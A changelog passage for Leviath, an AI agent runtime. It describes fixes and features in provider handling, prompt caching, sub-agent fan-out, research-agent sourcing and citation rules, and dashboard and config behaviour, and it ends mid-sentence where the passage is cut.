# Changelog

Notable changes to Leviath. Versions follow [semver](https://semver.org); the
workspace publishes in lockstep, so one version covers every `leviath-*` crate
and the `lev` binary.

Release binaries ship through the alpha, beta, and stable channels described
in [the release docs](https://leviath.dev/docs/releases); each versioned
GitHub release also carries auto-generated notes listing the merged pull
requests since the previous version. A channel publishes only when the version
below it has moved, so the headings here and the releases on GitHub are the
same list.

## Unreleased

- Fixed: a model that takes only its default temperature no longer kills the
  run. `gpt-5.5` rejects any other value outright, the capability table said it
  supports one because the rest of the `gpt-5` family does, and a research run
  died at `analyze` after 37 iterations and 2.4M tokens over an HTTP 400. The
  table is corrected, but a table is the wrong thing to depend on - the next
  model to behave this way will be wrong in it on the day it ships - so the
  refusal is now read from the API's own error, the request retried without the
  field, and the answer remembered for the rest of the process. Both the direct
  OpenAI provider and the OpenRouter gateway, which reaches the same models.
- Fixed: an Anthropic model reached through OpenRouter can cache its prompt
  again. System blocks - the stage prompt and the pinned context regions, which
  are the stable and by far the largest part of a request - were sent as plain
  strings, so nothing marked them and nothing was cacheable. Two research runs
  read **zero** tokens from cache across 2.9M and 5.9M input tokens. DeepSeek hid
  this for as long as it was the model in the OpenRouter slot, because it caches
  server-side with no markers at all and reported hits regardless. Which blocks
  to mark is the Anthropic provider's existing choice rather than a second
  implementation, so a marker still never lands on content that changes every
  turn.
- Fixed: a cache marker no longer lands on content that changes every turn.
  Assembly sorts `stable` blocks ahead of `grows`, the marker test asked only
  whether a block itself held still, and the selection then kept the *last*
  candidates - so on a real research-agent block list both markers went to
  `sources_index` and `raw_findings`, appended to on nearly every turn, while
  the two genuinely stable blocks went unmarked. Every entry was invalid before
  it could be read. A marker now has to have a whole prefix that holds still,
  and the deepest such point is always claimed first; remaining budget still
  goes deeper, where it pays on a turn that appended nothing. This is the direct
  Anthropic path as much as the gateway one.
- Fixed: `cache_write_tokens` was hardcoded to zero for every OpenAI-compatible
  provider, so a run that paid the 1.25x write premium recorded none of it and
  its token accounting understated what it cost. OpenRouter reports the figure
  and it is now read, in the streaming and non-streaming paths alike.
- Added: the terminal UIs remember the choices you have already made, in one
  `ui-state.json` under the data directory rather than each surface inventing
  its own answer. `lev setup` no longer re-proposes an MCP server or a bundled
  blueprint you turned down: it is still listed, so you can change your mind,
  but it is not pre-selected and finishing the wizard again will not quietly
  bring it in. Only refusals are kept, and only from a run you finished -
  accepting needs no memory, since the server lands in your config and the
  blueprint on disk. A blueprint's refusal is recorded against the version that
  was offered, so a newer one is a fresh offer rather than something an old "no
  thanks" hides. The dashboard joins it with three more: the sort order `s`
  cycles, the agent the new-run screen opens on (whichever you last launched),
  and how each run's Context view was left folded - per run, since folding
  `conversation` on one says nothing about another, and dropped when that run is
  deleted or put back to its defaults.
- Changed: nothing transient or consequential is remembered, deliberately. A
  filter, a search and the run marks are gone when you come back, because
  reopening with yesterday's filter silently applied is a bug rather than a
  convenience; and unattended (`Ctrl-Y`) stays off every time the new-run screen
  opens, because a setting that runs tools without asking is the last one
  anybody should inherit from last week out of sight.

- Fixed: the bundled agents' OpenRouter entry named a much cheaper model than
  the rest of their list, so `default_provider = "openrouter"` quietly meant "run
  every stage on the cheapest model this blueprint mentions". OpenRouter is a
  gateway rather than a model family and serves the same models the other entries
  name, so each blueprint's OpenRouter slot now names its own first choice -
  `anthropic/claude-sonnet-5` where the first entry is `claude-sonnet-5` on
  Anthropic, `anthropic/claude-opus-5` where it is `claude-opus-5`. Preferring
  the gateway now changes who bills you and nothing else. Seven blueprints,
  forty-nine stages.
- Added: `anthropic/claude-sonnet-5` and `anthropic/claude-opus-5` to the
  OpenRouter model catalog, so `lev models list` shows them and their
  capabilities are the direct entries' rather than the defaults an unlisted model
  would get - `supports_temperature = false` in particular, which defaults the
  other way.
- Fixed: the MCP handshake deadline is settable, so a stalled CI runner stops
  failing the suite. `MCPClient::connect` gave the `initialize` handshake a
  hardcoded 30 seconds - the right answer to "how long should a person's agent
  startup hang on a broken server", and the wrong one for a test, whose clock
  belongs to a build machine. On 2026-08-21 a `windows-latest` job stopped
  executing for 159 seconds (zero tests completed; the binary took 241s against
  a normal 40s) with all four subprocess-spawning MCP tests in flight, and the
  one carrying this deadline was the only casualty - its panic reported the
  instant the process was scheduled again, about a Python stub that had never
  been given a chance to answer. Production keeps the 30s; the tests pass five
  minutes, bounded so a genuinely wedged server still fails rather than hanging
  CI.
- Fixed: Ollama no longer registers as a usable provider when nothing is
  listening for it. Every other provider registers only when it has an API key;
  Ollama needs none, so it registered unconditionally and an install with no
  local server still advertised a working provider. That is the reason
  `default_provider` promotes its own entries to the front of a stage's model
  list, which in turn is why an install with keys for four providers could send
  every stage to the fallback its blueprint listed fourth.
- Fixed: `lev doctor` no longer reports that a configured `default_provider`
  with no `default_model` "is never chosen". That is true only of doctor's own
  check, which resolves no blueprint. A real run promotes every entry on that
  provider to the front, so the setting decides where every stage goes. The note
  now says both, because reading the old one during an investigation of a
  downgraded run sent it in the wrong direction.
- Added: `lev validate` prints the model each stage would actually use on this
  machine, and the blueprint's own order underneath when the two differ. A
  config line could silently move every stage onto a fallback model, and the
  only evidence was in a finished run's metadata.
- Changed: the provider docs described `default_provider` on its own as buying
  nothing. It buys the whole ordering. They now also say what `default_model`
  costs: a blueprint chooses per stage on purpose, and pinning one model
  flattens that, so cheap stages start paying top-tier prices while the stage
  that decides things loses the model its author picked for it.
- Added: the run list's folds outlive the dashboard. Folding four finished
  fan-outs to see the two live ones is a decision, and having to make it again
  every time you open `lev dash` is the feature failing to be one. They are kept
  in `ui-state.json` under the data directory, beside the agent editor's
  canvas arrangements, and written on the keystroke that makes them rather than
  on the way out - a dashboard is usually closed by whatever closes the
  terminal, so "save on quit" is a save that often never happens. A list still
  starts fully expanded until you fold something. A fold whose run is deleted is
  forgotten, but only once the dashboard can actually see a run list: an empty
  one is also what the first tick and an unreadable runs directory look like,
  and pruning against that would wipe every remembered fold on startup.
- Fixed: a research agent no longer concludes that something is missing because a
  page it read did not mention it. An overnight run investigating an agent runtime
  fetched the project's landing page, never opened the docs tree linked in the nav
  of the very HTML it received, and then marked OpenTelemetry, MCP, provider
  abstraction, sub-agents, scriptable tools and human-in-the-loop as absent - each
  one has its own documentation page. It proposed building them as priority work.
  Absence is now a claim that needs its own evidence: search the subject's own
  docs for the thing by name, and if you cannot, write "not found in <what you
  read>" rather than "does not have it".
- Changed: a front page is not the source. When a research agent fetches a landing
  page, a repository root or a product site, it reads the navigation and follows
  what bears on the question before concluding anything. A project's own docs and
  its own source outrank every write-up about it.
- Fixed: `wide-researcher`'s survey prompt had a sentence cut in half by the
  coverage check added in the previous release.
- Added: `POST /api/fs/dirs` makes one directory, so the console's folder
  picker can offer the "New Folder" a browser cannot get from a native dialog.
  `GET /api/fs/dirs` let somebody choose an agent workdir without typing a path
  blind, but there was no way to make one: noticing the folder you wanted did
  not exist meant leaving the console, opening a terminal on the serving
  machine, `mkdir`, and coming back. The body names the parent and one new
  segment separately, so the `--workdir-root` check runs on ground the caller
  has already proved it can list and a `name` carrying separators is malformed
  input rather than something the fence has to catch. Every other guard mirrors
  the listing route, an existing target is a `409` rather than a silent success,
  and it is announced as `fs.mkdir` so one console can tell which daemons have
  it.
- Added: the dashboard's sub-agent tree folds. `←` folds the selected run's
  workers away and `→` puts them back; on a run without any, `←` moves up to its
  parent and `→` down into the first worker. A foldable row wears a `▸`/`▾`
  arrow, a folded one says how many runs it is hiding, and the help bar offers
  the keys only when there is a tree to work. Folds are keyed by run, so they
  survive sorting, filtering and new rows, and folding the run you were inside
  leaves the highlight on the fold rather than at the top of the list.
- Added: the dashboard answers the mouse. Click a run to select it and again to
  open it, click its `▸`/`▾` arrow to fold its workers, click a stage tab or one
  of the content pane's `[l]` / `[o]` / `[c]` chips to switch to it, click a row
  of the Context tree to fold or unfold it, click the log panel to move the keys
  there. Every renderer registers what it drew and where, so a click acts on
  what is under the pointer rather than on a position derived twice. Drag still
  selects text and copies it on release.
- Fixed: a finished run's last transition no longer animates on the stage graph.
  The pulse means "the run is travelling this path", and it kept running into
  the final stage of a run that had completed, errored or been cancelled. A run
  that is merely parked keeps it: it has not finished, and the pulse is what
  says where it stopped.
- Added: `deep-researcher` and `wide-researcher` can ask a clarifying question
  before they commit the run to a reading of the task. Granted only on the first
  stage, where a wrong reading costs everything downstream; an unattended run is
  never offered the tools at all (the resolver drops a blocking tool when nobody
  is watching), so it costs `--yolo` nothing and cannot hang it.
- Changed: credibility is about what a source IS, not how authoritative it
  sounds. Only the primary artifact - the paper, spec, model card, official docs,
  registry or leaderboard - can be high for a factual claim about that artifact,
  and a number appearing in exactly one roundup with nothing corroborating it is
  low. A run recommending local models graded an SEO listicle `high` and rested
  every VRAM figure on it.
- Changed: a "which one should I use" question has an authoritative index too,
  even when it names none. Searching the question as asked returns roundups; the
  research agents are now told to go to the model cards, the leaderboard or the
  vendor's docs for anything they will state as a number. The same run fetched
  ten sources and not one was a model card.
- Changed: a qualifier travels with the claim it qualifies. The same run carried
  "yes, with offload" and "~22 tok/s" in its comparison table and dropped both
  from the recommendation - the one place the tradeoff mattered.
- Changed: the research agents check their own coverage before they hand off and
  the analysis stage can send them back for it. The question both ask is the same
  one: for every figure the report will state, is there a source that measured
  it, or only pages repeating it? A number that lives only in roundups sends the
  run back to fetch the artifact. Re-running the weakest run we had on the old
  prompts turned ten SEO listicles with four graded `high` into twenty sources
  where every `high` is a model card, a vendor's own docs or a leaderboard, and
  every roundup sits at `medium`. It costs roughly twice the tool calls.

- Fixed: a `required` region an earlier stage gave up on and a later stage filled
  is no longer reported as missing. The flag recorded a moment and consumers read
  it as a present-tense fact, so a `deep-researcher` run that abandoned
  `sources_index` in `gather`, had `analyze` write it, and finished with a
  fifty-citation bibliography still warned that later stages had worked from an
  artifact that was never written. The moment stays in the log; the flag now
  answers "what is actually missing", checked at every stage boundary.
- Changed: the research agents are told to append each bibliography line in the
  same turn they read the source, and that writing the bibliography into their
  reply does not count - it has to be a `context_append` call. One run in three
  fetched twenty sources, wrote the whole bibliography out as prose at the end of
  `gather`, and left `sources_index` empty; the region is what the next stage
  reads, not the message.
- Fixed: a `mode = "fan_out"` stage's own call is delivered as a stage fan-out
  again, so `results_region` and `merge_stage` mean something. Making the stage
  grant the `fan_out` tool left every call looking like a tool call, and the
  stage door was wired to the tool exit: a live `deep-researcher` fan-out put
  three workers' findings into `conversation` as a tool result and resumed the
  split stage, instead of writing `sub_findings` and moving on to `analyze`. The
  run then ended with nothing. `FanOutOrigin::Stage` had become unreachable
  outside the tests that built it by hand, which is why nothing caught it.
- Fixed: a fan-out stage no longer has two budgets fighting over the same loop.
  `max_attempts` bounds how many times the stage is asked to call `fan_out`;
  `max_iterations` was also counting those asks, and firing first. A live
  `deep-researcher` run spent three of `investigate`'s four iterations answering
  in prose, called `fan_out` on the fourth, and three workers then researched for
  thirteen minutes - all of which was discarded, because the stage was already at
  its cap when they came back. `lev validate` has always held that a fan_out
  stage needs no `max_iterations`; the runtime was enforcing one anyway, and now
  does not.
- Changed: `api_version` on `GET /api/config` is this build's own version rather
  than a hand-maintained literal. It was held equal to the OpenAPI spec by a test
  and to the crates by nobody, so the two agreed only because somebody had last
  typed the same string into both - and `cargo xtask version` wrote neither. The
  first release after any bump would have served a version naming a build it was
  not, silently, with the suite green. `cargo xtask version` now rewrites the
  spec's `info.version` too, so the existing test guards the release instead of
  just the document. It moves on every release now, including ones no client can
  observe; `capabilities` is still what a client should feature-detect on.
- Added: a run's rename now reaches a websocket subscriber. A run is created
  untitled and named a moment later, once a model has shortened its prompt into
  a title, and nothing on the wire said so - a console showed the prompt's first
  line until an unrelated re-read or the next thirty-second poll replaced it,
  which is the window where somebody is actually looking at the run they just
  started. There is a `run_renamed` frame for the moment, and `title` on every
  `agent_status` frame after it so a client that connected or reconnected in
  between reads the name off the next status instead of fetching the run.
  Announced as the `events.title` capability, so a console can drop that poll
  where the daemon has it and keep it where it does not.
- Changed: the research agents cite with linked markers - `[[n]](<url>)`, which
  renders as `[n]` and clicks through to the source - so checking a claim no
  longer means scrolling to the bibliography and pasting a URL by hand. A source
  with a local path instead of a URL stays a bare `[n]`.
- Fixed: `wide-researcher` never asked for a bibliography section, so one run
  produced a source table of titles and credibility grades with no URLs at all -
  for a task whose whole point was a reading list. It now asks for the numbered
  bibliography from `sources_index` with the URL on every line, as
  `deep-researcher` already did.
- Fixed: `deep-researcher` and `wide-researcher` never told their merge stage
  where the fan-out results land. The workers' findings sat in a pinned region
  the stage had not been pointed at, so it went looking for files named after the
  work items - the same shape as the region-as-a-path misfire, one layer up. Both
  now name the region and say plainly that the findings are not files.
- Fixed: `researcher` was told to write its report and not where, so workers
  invented plausible absolute paths (`/research/...`, `/home/user/output/...`)
  that the workspace guard refused, losing the artifact. It now asks for a plain
  relative filename and says the findings reach the caller either way.
- Changed: a claim about something a task names only as a comparison is graded on
  what that run actually read about it. Two mirrored runs - one researching
  GLP-1s "like creatine", one researching creatine "like Ozempic" - agreed on the
  substance, but the creatine run sourced a GLP-1 trial figure to a supplement
  blog and graded it HIGH, while the run that read the trials reported a
  different number and flagged the disagreement.
- Changed: `read_file` on a directory now names `list_dir` instead of returning
  the raw OS error. `read_file(".")` was the single most common failed tool call
  across four research runs, and "Is a directory (os error 21)" names the problem
  without naming the fix.

- Added: `fan_out`, a tool any stage can grant to run many sub-agents at once and
  get their results back together. There were two ways to start sub-agents and
  they shared nothing: `spawn_agent` was a tool an agent called mid-work, while
  a fan-out was a whole stage whose raw text output the runtime parsed into a
  work-item list. There is now one engine with two doors into it - the tool, and
  `mode = "fan_out"` as sugar that grants it and transitions to `merge_stage`
  when it returns. Both park the parent the same way, so both survive a daemon
  restart, which only the stage did before. A fan-out started by a tool call
  comes back as that call's result and is routed by the stage's `tool_routing`
  like anything else, so where the report lands - a region, the conversation, or
  nowhere - is a blueprint decision rather than a fan-out feature.
- Removed: the free-text split. A fan-out stage's answer used to be prose that
  the runtime scraped a JSON array out of, with a correction loop, a tolerant
  parser and a degradation path behind it. All of that is gone: the stage calls
  the tool, and a model that will not is nudged a bounded number of times and
  then let through, the same shape a missing `submit_output` already had. The
  short-lived `submit_work_items` tool is gone with it - it was a second tool
  for the same act.
- Changed: `splits_degraded` now counts fan-out stages that started no workers,
  and is visible rather than only present in `meta.json`. `lev ps` renders such
  a run as `complete (fan-out empty)` beside the existing `(no output)`, and the
  serve API carries the count next to `empty_output`. A merge stage running on
  nothing and one running on a genuinely empty fan-out are indistinguishable
  from the far side; this is what tells them apart.
- Changed: the five bundled fan-out agents ask for a `fan_out` call rather than
  a JSON array, and `spawn_agent` is documented for the first time.
- Added: `max_attempts` on a `fan_out` stage - how many times it is asked again
  when it ends without having called the tool, before it is let through without
  workers. Defaults to 3, as it was fixed at before. Raise it for a small or
  local model that needs more than a nudge; `0` lets the stage through on its
  first refusal, for a blueprint where an empty fan-out is an acceptable outcome
  and the retries are not worth their prompts. Deliberately separate from
  `max_revisits`: each retry re-sends the whole stage context, so borrowing a
  routing budget for this one quietly multiplies an inference bill.
- Changed: `lev validate`'s `fanout-no-escape` now warns only where the risk is
  still real - `on_worker_failure = "fail_all"` with no `error` or `dead_end`
  edge, where one flaky worker ends the run with nowhere to go. The default
  policy merges what succeeded and is no longer nagged about an escape it does
  not need.

- Fixed: a runtime-detected failure no longer ends a run that declared a
  recovery stage. A fan-out split that could not be parsed, a routing call that
  failed or answered with a stage that does not exist, `on_worker_failure =
  "fail_all"`, a lost workspace and a wedged run all wrote a terminal status
  directly, which `resolve_transition` then skipped, so the `error` edge the
  author wrote was never consulted. Every one of them now goes through the
  stage's transition, and an errored stage falls back to a `dead_end` edge when
  it has no `error` edge, matching the fallback that already ran the other way.
  A `deep-researcher` run died of this with its four workers finished, its
  analysis written, three stages still pending and an `error_recovery` stage
  sitting unused in its graph.
- Fixed: a fan-out split is never terminal. After its corrections are spent it
  takes the stage's `error` edge, then its `dead_end` edge, and failing both an
  empty fan-out into the merge stage, with the reason written into
  `error_report` and counted in the new `splits_degraded` run flag. By the time
  a split runs, the parent has usually done most of the work; ending the run
  throws all of it away.
- Fixed: a fan-out split's correction budget is per split rather than per run.
  `SplitAttempts` was never cleared, so a stage whose first split needed one
  correction got a single correction the next time it split, and a stage
  entered twice could fail on its second answer.
- Added: `submit_work_items`, the tool a `fan_out` stage's split answers with.
  Every fan-out stage is offered it regardless of its `available_tools`. The
  split was the one structured answer the framework asked for in prose and then
  scraped a JSON array out of; free text remains the fallback, because a
  blueprint picks its own model per stage. Its description says the thing a
  split most needed to be told and had nowhere to read: an empty `items` array
  is a real answer, and the run moves on to the merge stage.
- Changed: a fan-out stage entered more than once is told which round it is on
  and which work items already came back, and is asked for only what is still
  unanswered. The prompt was previously byte for byte the one the model had
  already answered, over a context holding the first round's findings and the
  analysis built on them - so the model replied that the research was finished,
  which was true and was not a list of work items. A first entry is unchanged.
- Changed: the free-text split parser takes the near misses instead of spending
  a correction on each: an `{"items": [...]}` envelope, a single bare object, a
  plain array of question strings, and a fenced block in preference to the
  first-bracket-to-last-bracket scan (one `[6]` in a bibliography was enough to
  slice from the wrong place). It also strips text-protocol tool-call markup,
  which some models emit as prose.
- Added: `lev validate` warns (`fanout-no-escape`) about a `fan_out` stage with
  no `error` and no `dead_end` transition, since that is the blueprint shape
  where an unusable split degrades silently.

- Fixed: `web_fetch` now retries a transport failure instead of losing the page
  on the first one. A single `send()` was the whole story, so one dropped
  connection or protocol fault ended that source permanently, and the
  diagnostic the agent read said "the page may be too large (>1MB) or the
  request was blocked" for every cause alike. An agent told the wrong reason
  picks the wrong recovery, and one told "blocked" concludes the source is
  unreachable and writes the citation from memory. That is how a research run
  came to cite fifteen sources while having opened only eight of them, with a
  credibility grade on each of the seven it never read. Transient failures now
  get two more attempts, an HTTP/2 protocol fault pins the retry to an
  HTTP/1.1-only client (a per-request version hint does not help, because ALPN
  settles the protocol during the TLS handshake), and the message names what
  actually happened and says outright that the fetch did not read the page.
- Added: `[limits] script_http_max_per_host` (default `4`, `0` for unbounded)
  and `[limits] script_http_timeout_secs` (default `30`). Nothing previously
  bounded how many script-tool requests a run could aim at one origin: a
  research stage batches six fetches, a fan-out multiplies that by the worker
  count, and the result is most of two hundred simultaneous connections to a
  single host. That reads as an attack, and the origin that answered such a
  burst by failing every HTTP/2 stream is the same one whose pages the run then
  cited without reading. Batching is unaffected; only requests sharing a host
  stagger.
- Changed: the batch-tool hint now names web searches and fetches, and says
  that a batch runs in parallel. It previously listed only file and shell work,
  so the agents doing the most fetching were the ones it spoke to least. The
  three research blueprints say the same in their own words. Tool batches
  already ran in parallel; what this buys is fewer, larger batches, and turns
  are where a research run actually spends its wall clock.

- Fixed: a Rhai script no longer builds a malformed request body when the
  prompt contains an invisible character. Rhai's own standard library registers
  `to_json(&mut Map)`, and an object map is exactly what a provider script
  passes, so that more specific signature beat Leviath's serde encoder and every
  request body went through Rhai's hand-rolled formatter instead. That formatter
  writes strings with Rust's `Debug`, which spells a narrow no-break space
  `\u{202f}`. JSON has no such escape, so a single invisible character anywhere
  in the prompt made the whole request unparseable and the API answered `HTTP
  400 ... invalid escape at line 1 column N`. The failure looked like a provider
  outage rather than a client bug: runs worked for several turns, then every one
  of them died at once, parent and fan-out workers together, as soon as a model
  reply or a fetched page carried a narrow no-break space, a zero-width space, a
  BOM, a bidi mark or a stray control byte. Printable characters were unaffected,
  which is why quotes, dashes and box glyphs had passed for months. Both script
  engines now register the encoder for an object map explicitly, so `to_json`
  means serde in a provider script and in a tool script alike.
- Fixed: `web_fetch` no longer returns a page of replacement characters when a
  server answers compressed. The HTTP stack was built without `gzip`, `brotli`
  and `zstd`, so it advertised no encoding, and a server that compressed anyway
  had its bytes decoded lossily into mojibake that reached the model as though
  it were the article. The three decoders are enabled, and a body that still
  decodes mostly to replacement characters is refused with a message that says
  so rather than handed on. The declared-content-type check was already there;
  this catches the case that declares `text/html` and is not text.

- Fixed: a run's `--model` override now covers fan-out workers and sub-agents,
  not just the parent blueprint. Both spawn paths passed `model: None` while
  carrying every other field of the parent down - workdir, `--yolo`,
  `--no-seed-commands`, the requested output shape - so
  `lev run deep-researcher --model cerebras/gpt-oss-120b` sent the parent's
  stages to Cerebras and all thirty workers to whatever the worker blueprint
  listed. That is the large majority of a run's spend landing on providers the
  operator explicitly overrode away from, with no warning and no log line, and
  it made benchmarking a provider this way report a number that was mostly not
  about that provider. `providers.md` called the override absolute already
  ("overrides everything"); it now is. A run that names no model leaves every
  child resolving against its own blueprint exactly as before.

- Fixed: `GET /api/models` now reports a Rhai script provider's models, so The
  Lair offers them on the new-run page, in the agent editor and in settings.
  `ProviderRegistry::provider_names()` returns natively registered providers
  only and the script layer is reachable through `get()`, so an enumeration
  built on it skipped script providers entirely - the same defect fixed for
  `lev models list --provider` in the previous release, in a sibling surface.
  The registry now answers `resolvable_names()` for callers that are
  enumerating, and both the API path and `lev models list --remote` use it.
  Until now the provider showed under Custom Gateways while none of its models
  existed anywhere.

- Fixed: `lev serve` no longer answers `GET /api/config` from a snapshot taken
  at start-up. An edit saved through `PUT /api/config` was written to disk and
  never read back, so reloading the page showed the old value and the save read
  as lost; an edit made anywhere else was invisible for the life of the process,
  and since `lev serve` is a separate process from `lev daemon`, restarting the
  daemon did not help. Every handler now reads the file through the same
  mtime-checked reloader the daemon uses, so a change - from this API or from
  outside - is visible to the next request.

- Fixed: `[model_providers.<name>]` is now as hot as the `.rhai` file it
  configures. A provider script has always been re-read when its file changes,
  but the table feeding its `initialize(config)` was captured at daemon boot, so
  editing the script's code took effect on the next run while editing the config
  it receives silently did nothing until `lev daemon restart`. Setting a
  `base_url` and watching it have no effect was indistinguishable from having
  typed the key wrong. The layer now reads that config on every load, and its
  compiled-script cache is invalidated by a config change as well as by the
  file's mtime. `[model_capabilities]`, `request_timeout_secs` and `[security]
  allow_env_vars` reload with it; the shared HTTP client still does not, since
  it holds a connection pool.

- Fixed: a network blip no longer ends a run. `Response::json` does two things -
  read the body off the socket, then parse it - and every provider mapped both
  failures to "invalid response", which the retry policy treats as permanent. So
  a dead socket got no retry, no failover and no circuit-breaker record: it went
  straight to the terminal error arm and took the run's work with it. Measured on
  a laptop that slept for 31 minutes and woke onto a different network: three
  runs with 35-38 iterations of completed work each died with `Invalid response:
  error decoding response body` twenty seconds after the lid opened, and a fourth
  died the same way on an ordinary blip with no sleep involved. A body that never
  finished arriving is now reported as the transport failure it is - retried,
  counted against the provider, eligible for failover - while bytes that arrived
  and did not fit the schema stay permanent. If the provider still cannot be
  reached once the retries are spent, the run parks with a remedy instead of
  failing, so `lev resume` gets the work back.

- Fixed: a paused run is no longer walked forward, or killed, by the inference
  that was already in flight when it paused. Pause lets the outstanding step
  finish, but its result was applied unconditionally: a success carried the run
  on through its tool calls and stage transitions while it still displayed
  `paused`, and a failure overwrote the pause with an error and discarded the
  run. The outcome is now held and replayed on resume, so the response you have
  already paid for is used rather than thrown away. Relatedly, a paused run with
  a call still outstanding is no longer paged out of memory while it waits: an
  in-flight inference is a live continuation like a blocked prompt, and parking
  the run meant the answer arrived at a despawned entity and was dropped, so the
  resume quietly paid for the same turn twice.

- Fixed: pausing a fan-out parent now pauses the runs that are actually working.
  A parent waiting on its children is not itself pausable - the merge poll reads
  that status - so the request was refused while every child carried on. Pause
  and resume now walk the whole sub-agent tree, as cancel already did, and a
  paused fan-out stops starting the next queued worker instead of immediately
  replacing the children it just paused. Resuming the parent releases them all.
  `lev pause`/`lev resume`, the REST endpoints and the dashboard's `p`/`r` keys
  all go through it.

- Fixed: an inference-pool limit of `0` no longer parks every affected run for
  the life of the daemon. Waiting for a full pool is ordinary backpressure and
  is deliberately never failed or reported, so a pool of nothing was a wedge
  with nothing said about it - and the schema's `minimum: 1` had nothing
  enforcing it, since config values are not validated against the schema at run
  time. `[limits] max_concurrent_inferences` and both of its per-model and
  per-provider tables now read a `0` as `1` and say so in the log, matching the
  tool lane, which has always clamped its own width. To lift a limit, delete
  the key.

- Fixed: `lev models list --provider <name>` now reaches a Rhai script
  provider. `ProviderRegistry::provider_names()` enumerates natively registered
  providers only, and the script layer is consulted by `get()`, never by that -
  so the one command `rhai-providers.md` prescribes for smoke-testing a
  provider script answered "No models available." for a working provider and a
  syntactically broken one alike. A `--provider` naming neither a registered
  provider nor a row in the built-in table is now loaded through the script
  layer and asked for its catalog, with or without `--remote` (a script names
  its models at run time, so there is nothing local to read). A script that
  will not load, and an error raised by its `list_models`, each now **fail the
  command** rather than being folded into an empty table under an exit code of
  0, so it works as the CI gate the docs send you to it for. A `--provider` the
  built-in table knows but this install has no credential for is still an empty
  table and still exits 0. `lev doctor --help` and the CLI reference no longer
  say a script provider cannot be listed.

- Added: `[limits.max_concurrent_inferences_by_provider]` caps in-flight
  requests to one provider across every model it serves, and
  `[limits.max_concurrent_inferences_by_model]` overrides the global cap for one
  model id. `[limits] max_concurrent_inferences` was the only concurrency knob
  and it applied to every model's pool, so bounding spend on one metered
  provider also throttled Anthropic and OpenAI on the same machine - while
  `configuration.md` and `engine.md` both described a per-model pool entry that
  had no configuration surface at all. The provider cap is a second, coarser
  pool in front of the per-model one: a request takes a slot in both and holds
  both until it finishes. A provider nobody caps has no pool of its own, so
  nothing an existing install runs is bounded any more tightly than before.
  The daemon's health reading carries provider-pool occupancy alongside the
  model pools (`lev ps --json` under `health`, and the lane heartbeat in the
  log), because a run parked on a full provider pool sees every model pool with
  room in it.

- Fixed: a WebSocket subscriber that drops a single pong is no longer
  disconnected. The server's liveness check had no deadline of its own - a ping
  left unanswered by the time the *next* ping was due meant a dead peer, so at
  the 20-second cadence one lost packet or one tab that resumed a moment late
  cost the client its stream. The pong deadline is now its own value (60
  seconds, three cadences), so a peer gets three chances to answer, and the
  test that covers a ponging client no longer has to win a 60 ms round trip on
  a loaded CI runner to pass.

- Fixed: agents no longer waste turns calling `read_file` on a context region.
  A stage that routes tool output into a region left a pointer in the
  conversation ending "read that region for the full result" - an instruction
  with no tool behind it, since the region is rendered into the system prompt
  already and most stages that route did not grant `context_read`. Models did
  the only thing left and aimed `read_file` at the region name. Across 152 local
  runs, 168 of 299 `read_file` calls failed and 90 of those were a region name
  where a path belongs, spread over 32 of the 46 runs that used the tool; one
  run spent five turns on five spellings of `raw_findings` across three stages
  and finished reporting that it had found nothing. The pointer now names the
  heading the region is rendered under and says no tool call is needed, a path
  tool aimed at a region says so in its error (as does one handed a directory
  instead of a file), every bundled stage that routes and reads files grants
  `context_read`, and `lev validate` warns
  (`routing-without-region-read`) when a blueprint has the shape that caused it.
- Fixed: a routed tool result that does not fit its region is no longer
  described as though it did. The pointer promised the full result whatever the
  region had actually kept, so a full region silently turned a fetched source
  into `[result omitted]` while the model went on reasoning as if it were there
  - three of thirty-five entries in one run, two of them dropped outright.
- Fixed: `admission = "evict"` evicts. It is the default and has always been
  documented as "make room for the write - roll off the oldest entry", but a
  write that did not fit was refused exactly as under `admission = "reject"`;
  only a sliding window's *count* limit ever dropped anything. A working region
  now rolls its oldest entries off to admit a new write, which is what stops the
  newest material being the thing that gets lost. Regions that own their own
  retention are untouched: `pinned` and persistent custom regions are meant to
  survive the run, a `hashmap` already evicts by LRU, and a custom region's
  `on_overflow` script is the author's policy and is not overridden. An entry
  larger than the whole region still fails without emptying it, since evicting
  for it would destroy what is held and fail anyway.
- Fixed: region budgets scale with the model again. Every bundled region paired
  `budget = "N%"` with an absolute `max_tokens`, and the cap is the smaller of
  the two above roughly a 167k window - `researcher` ran on a 1,048,576-token
  model with `raw_findings` asking for 30%, or 314,573 tokens, and getting
  40,000. Resolving each bundled layout at 200k and at 1M produced almost
  identical numbers, a growth of 1.03x across a 5.24x difference in window. The
  guard-rails are gone, along with the `threshold_tokens` that independently
  capped compaction triggers, so the percentage decides. `lev create`'s
  templates and the blueprint editor's new-region defaults lose their caps too,
  and the editor can now see and set `min_tokens`, which it never modelled.

- New: the scripts API manages Rhai model providers. `provider` joins `tool`,
  `region_hook`, `stage_hook` and `output_validator` as a `kind` on
  `GET /api/scripts`, `GET/PUT/DELETE /api/scripts/{kind}/{name}` and
  `POST /api/scripts/validate`, so a console can list, open, edit, validate and
  save the drop-in providers in `~/.leviath/providers` instead of leaving them
  as the one extension point that needed a text editor on the host. A provider
  belongs to the machine rather than to an agent, so it is listed either way and
  the routes refuse an `?agent=` rather than quietly scoping themselves to a
  directory nothing loads. Each entry carries what the script's `// @` comments
  declare, so a listing can show a provider's description and default model
  without fetching every file. Announced as `scripts.providers`; the API
  contract version is now 0.4.0.
- Fixed: a run is never titled with the model's own thinking. Runs on a
  reasoning model were coming back titled "We need to generate a short title
  for the user's request. The user wants to buil", which is chain-of-thought
  cut at exactly the 80-byte display cap. Three things lined up. The titling
  call allowed 64 output tokens, and a reasoning model spends that working up
  to an answer it then never reaches. The OpenAI-shaped parsers promote the
  `reasoning` channel into the reply when the reply itself is empty, which is
  right for an agent turn and wrong for this one. And the sanitizer, finding no
  line short enough to be a title, fell back to the first line truncated, so
  the prose was stored rather than discarded. Now the title call asks the
  provider not to think in the spelling that provider understands (`think` for
  Ollama, `reasoning` for OpenRouter), has 512 tokens in case it thinks anyway,
  and refuses both a reply that stopped at the token limit and one with no line
  that fits. A run with no title shows the task you typed, which is what the
  dashboard and `lev ps` already did. The cap is also measured in bytes on both
  sides now, so an 80-character CJK title is refused rather than sliced a
  quarter of the way through, and `<thinking>` and `<reasoning>` are stripped
  alongside `<think>` for local models that write the tags inline.
- Fixed: a provider script that defines `initialize` but not `inference` is
  refused when it loads, rather than compiling, initializing, caching, and then
  failing at the first inference part-way into a run. It is now skipped with a
  warning like any other broken script, so model selection falls through to the
  next configured model, and `POST /api/scripts/validate` reports it before the
  file is even saved. Validation still runs nothing: the entry points are read
